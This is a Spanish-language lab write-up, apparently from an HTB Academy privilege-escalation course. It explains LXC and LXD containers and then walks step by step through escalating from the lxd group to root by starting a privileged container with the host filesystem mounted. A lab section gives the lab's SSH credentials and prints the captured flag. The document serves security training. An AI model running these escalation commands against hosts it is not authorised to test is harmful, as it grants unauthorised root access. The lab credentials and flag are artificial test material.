
# Contenedores

Los contenedores funcionan a nivel de sistema operativo y las máquinas virtuales a nivel de hardware. De esta forma, los contenedores comparten un sistema operativo y aíslan los procesos de aplicación del resto del sistema, mientras que la virtualización clásica permite que varios sistemas operativos se ejecuten simultáneamente en un único sistema.

El aislamiento y la virtualización son fundamentales porque ayudan a gestionar los recursos y los aspectos de seguridad de la forma más eficiente posible. Por ejemplo, facilitan la monitorización para encontrar errores en el sistema que muchas veces no tienen nada que ver con aplicaciones recién desarrolladas. Otro ejemplo sería el aislamiento de procesos que normalmente requieren privilegios de root. Una aplicación de este tipo podría ser una aplicación web o una API que deba aislarse del sistema host para evitar que escale a las bases de datos.

***

## <mark style="color:purple;">Contenedores de Linux - LXC</mark>

Linux Containers (`LXC`) es una técnica de virtualización a nivel de sistema operativo que permite que varios sistemas Linux se ejecuten de forma aislada unos de otros en un único host al poseer sus propios procesos pero compartir el núcleo del sistema host para ellos. LXC es muy popular debido a su facilidad de uso y se ha convertido en una parte esencial de la seguridad informática.

De forma predeterminada, los `LXC` consumen menos recursos que una máquina virtual y tienen una interfaz estándar, lo que facilita la gestión simultánea de varios contenedores. Una plataforma con `LXC` incluso puede organizarse en varias nubes, lo que proporciona portabilidad y garantiza que las aplicaciones que se ejecutan correctamente en el sistema del desarrollador funcionarán en cualquier otro sistema. Además, las aplicaciones grandes se pueden iniciar, detener o modificar sus variables de entorno a través de la interfaz de contenedores de Linux.

La facilidad de uso de Docker `LXC` es su mayor ventaja frente a las técnicas de virtualización clásicas. Sin embargo, la enorme difusión de Docker `LXC`, un ecosistema casi omnipresente y herramientas innovadoras se deben principalmente a la plataforma Docker, que estableció los contenedores Linux. Toda la configuración, desde la creación de plantillas de contenedores y su implementación, pasando por la configuración del sistema operativo y la red, hasta la implementación de aplicaciones, sigue siendo la misma.

## <mark style="color:purple;">**Daemon de Linux - LXD**</mark>

Linux Daemon ( [LXD](https://github.com/lxc/lxd) ) es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistemas. Antes de poder usar este servicio para aumentar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando:

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

A partir de aquí, existen varias formas de explotar `LXC`/ `LXD`. Podemos crear nuestro propio contenedor y transferirlo al sistema de destino o utilizar un contenedor existente. Desafortunadamente, los administradores a menudo utilizan plantillas que tienen poca o ninguna seguridad. Esta actitud tiene la consecuencia de que ya tenemos herramientas que podemos utilizar contra el sistema nosotros mismos.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Este tipo de plantillas no suelen tener contraseñas, sobre todo si se trata de entornos de prueba sencillos. Deben ser de fácil acceso y de uso sencillo. El enfoque en la seguridad complicaría todo el proceso, lo haría más difícil y, por lo tanto, lo ralentizaría considerablemente. Si tenemos un poco de suerte y existe un contenedor de este tipo en el sistema, se puede aprovechar. Para ello, debemos importar este contenedor como imagen.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

Después de verificar que esta imagen se ha importado correctamente, podemos iniciar la imagen y configurarla especificando el indicador `security.privileged` y la ruta raíz del contenedor. Este indicador deshabilita todas las funciones de aislamiento que nos permiten actuar sobre el host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Una vez que hayamos hecho eso, podemos iniciar el contenedor e iniciar sesión en él. En el contenedor, podemos ir a la ruta que especificamos para acceder al `recurso` del sistema host como `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.31.165 (ACADEMY-LLPE-CONT)
Uusuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios y envíe el contenido de `flag.txt` como respuesta.

Una vez dentro del host por SSH vemos que pertenece al grupo `lxd`:

```shell-session
htb-student@ubuntu:~$ id
uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
```

Con un `lxc list` lo verificamos:

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc list
+--------+---------+---------------------+------+-----------+-----------+
|  NAME  |  STATE  |        IPV4         | IPV6 |   TYPE    | SNAPSHOTS |
+--------+---------+---------------------+------+-----------+-----------+
| ubuntu | RUNNING | 10.134.16.30 (eth0) |      | CONTAINER | 0         |
+--------+---------+---------------------+------+-----------+-----------+
```

Vemos que hay un directorio `ContainerImages` que contiene una plantilla `Alpine` comprimida:

```shell-session
htb-student@ubuntu:~$ ls
ContainerImages  snap

htb-student@ubuntu:~$ cd ContainerImages/
htb-student@ubuntu:~/ContainerImages$ ls
alpine-v3.18-x86_64-20230607_1234.tar.gz
```

Ahora vamos a importar este contenedor como imagen, y le damos el alias de `alpine`. Además con `lxc image list` nos aseguramos de que está importado correctamente:

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine
Image imported with fingerprint: 5cfe4f7510aa3893f14e7cb0097d202d8b86ef71bf9731f68ee55e7e8808a541

htb-student@ubuntu:~/ContainerImages$ lxc image list
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine | 5cfe4f7510aa | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Oct 21, 2024 at 8:32pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

Después de verificar que esta imagen se ha importado correctamente, podemos iniciar la imagen y configurarla especificando el indicador `security.privileged` y la ruta raíz del contenedor. Este indicador deshabilita todas las funciones de aislamiento que nos permiten actuar sobre el host.

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc init alpine privesc -c security.privileged=true
Creating privesc
htb-student@ubuntu:~/ContainerImages$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

Una vez que hayamos hecho eso, podemos iniciar el contenedor e iniciar sesión en él. Además si le pasamos el parámetro `/bin/sh` obtenemos directamente una shell del root:

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc exec privesc /bin/sh
~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # ls
~ # cd /root
~ # ls
~ # ls -l /mnt/root
total 68
lrwxrwxrwx    1 root     root             7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x    4 root     root          4096 Sep 22  2022 boot
drwxr-xr-x    2 root     root          4096 Oct  6  2021 cdrom
drwxr-xr-x   19 root     root          3980 Oct 21 20:22 dev
drwxr-xr-x  100 root     root          4096 Jun  7  2023 etc
drwxr-xr-x    3 root     root          4096 Sep 22  2022 home
lrwxrwxrwx    1 root     root             7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx    1 root     root             9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx    1 root     root             9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx    1 root     root            10 Apr 23  2020 libx32 -> usr/libx32
drwx------    2 root     root         16384 Oct  6  2021 lost+found
drwxr-xr-x    2 root     root          4096 Oct 21 20:22 media
drwxr-xr-x    2 root     root          4096 Apr 23  2020 mnt
drwxr-xr-x    2 root     root          4096 Apr 23  2020 opt
dr-xr-xr-x  320 root     root             0 Oct 21 20:22 proc
drwx------    6 root     root          4096 Jun 14  2023 root
drwxr-xr-x   28 root     root           900 Oct 21 20:24 run
lrwxrwxrwx    1 root     root             8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x    8 root     root          4096 Jun  7  2023 snap
drwxr-xr-x    2 root     root          4096 Apr 23  2020 srv
dr-xr-xr-x   13 root     root             0 Oct 21 20:22 sys
drwxrwxrwt   13 root     root          4096 Oct 21 20:39 tmp
drwxr-xr-x   14 root     root          4096 Sep 22  2022 usr
drwxr-xr-x   13 root     root          4096 Apr 23  2020 var
```

Buscamos la flag dentro de `/mnt/root`:

```shell-session
~ # find /mnt/root -name "flag.txt" 2>/dev/null

/mnt/root/root/flag.txt
~ # 
~ # cat /mnt/root/root/flag.txt
HTB{C0nT41n3rs_uhh}
```
